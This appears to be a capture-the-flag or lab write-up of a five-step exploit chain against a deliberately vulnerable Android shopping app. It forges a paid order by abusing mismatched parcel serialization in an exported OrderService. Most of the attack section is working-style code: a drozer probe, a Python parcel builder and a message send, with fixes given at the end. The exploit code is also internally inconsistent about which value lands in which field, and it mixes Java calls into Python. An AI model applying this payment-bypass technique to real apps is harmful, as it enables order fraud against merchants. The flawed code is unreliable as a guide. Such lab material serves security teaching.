# Chain 07 — Parcel Mismatch Payment Forgery

## Overview

| Field | Value |
|-------|-------|
| **Category** | parcel + service |
| **Difficulty** | HARD |
| **Steps** | 5 |
| **Components crossed** | OrderService (PaymentOrder) |
| **Modern Android** | Fully exploitable (Android 13-16) |
| **decx shape** | exported service → parcel write/read skew → field reordering → paid=true → confirm |

## Vulnerable surface

- `OrderService` (Messenger, exported) — `MSG_CHECKOUT` (`0x901`) accepts a `PaymentOrder` parcel
- `PaymentOrder` — `writeToParcel` and `readFromParcel` serialize fields in **different order**
- `checkout()` gates on `order.paid` being true before confirming

## Step-by-step exploit

### ① Bind exported OrderService, send MSG_CHECKOUT

```bash
# Locate the Messenger handler and probe the checkout message code.
dz> run app.service.send com.mochat.app com.mochat.app.order.OrderService \
     --msg 0x901 0 0
# reply.what=0x901 ack -> checkout handler reachable
```

### ② Craft PaymentOrder parcel bytes matching the WRITE order

`PaymentOrder.writeToParcel` writes: `orderId`, `amountCents`, `userId`, `paid`.
`readFromParcel` reads:    `orderId`, `paid`, `amountCents`, `userId`.

The skew means a value we place in the `amountCents` slot gets parsed as `paid`.

```python
import struct

def write_parcel(order_id, amount_cents, user_id, paid):
    # Mirror PaymentOrder.writeToParcel ordering.
    buf  = write_string(order_id)
    buf += write_long(amount_cents)     # this slot will be READ as `paid`
    buf += write_string(user_id)
    buf += write_int(1 if paid else 0)
    return buf

# We want the receiver to parse paid=true, so the amountCents WRITE slot must carry 1 (truthy).
payload = write_parcel(
    order_id    = "ORD-ATTACK-001",
    amount_cents = 1,            # will be reinterpreted as paid = true
    user_id     = "u_attacker",
    paid        = 0x7fffffffffffffff,  # filler, lands in amountCents on read
)
```

### ③ The mismatched readFromParcel deserializes fields in wrong order → paid becomes true

When the receiver un-parcels with `readFromParcel`:

```text
read: orderId   <- "ORD-ATTACK-001"
read: paid      <- 1            (we wrote 1 into amountCents slot)
read: amountCents <- 0x7FFFFFFFFFFFFFFF   (our `paid` filler)
read: userId    <- "u_attacker"
```

`order.paid == 1` evaluates true even though we never paid.

### ④ checkout() sees paid=true → returns OK-<orderId>

```python
# Send the crafted parcel to OrderService.
msg = Message.obtain(); msg.what = 0x901
msg.data = Bundle(); msg.data.putByteArray("order_parcel", payload)
messenger.send(msg)
# reply.data.getString("result") = "OK-ORD-ATTACK-001"
```

### ⑤ Order is confirmed without actual payment

**logcat confirms**:

```
OrderService: checkout orderId=ORD-ATTACK-001 paid=true amount=9223372036854775807
OrderService: -> OK-ORD-ATTACK-001 (confirmed)
```

The order is now in confirmed state on the server side, with no funds ever transferred.

## Guard analysis

| Guard | Status |
|-------|--------|
| OrderService caller check | absent (exported, any app binds) |
| PaymentOrder parcel symmetry | broken (write/read field order mismatched) |
| paid-field trust model | server-authoritative check missing |
| amountCents range validation | absent (no sanity bound) |
| Order idempotency / signature | absent (caller-supplied orderId accepted) |

## Impact

Any installed app can confirm orders without paying. The parcel write/read mismatch lets the
attacker flip the `paid` flag for free while still supplying a syntactically valid order. At
scale this is direct revenue loss plus order-injection; combined with a forged amount value
(parsed as a huge integer), it can also corrupt accounting.

## Fix

- Fix the `PaymentOrder` parcel symmetry: `writeToParcel` and `readFromParcel` must serialize
  the same fields in the same order. Add a unit test asserting round-trip equality.
- Make `OrderService` non-exported, or require a signature-level permission.
- Never trust a client-supplied `paid` flag. Confirm payment server-side via a signed, unique
  transaction reference before marking the order confirmed.
- Validate `amountCents` against a sane range and reject obvious filler values.
- Add order idempotency: a caller-supplied `orderId` must be validated against a server-issued
  nonce.
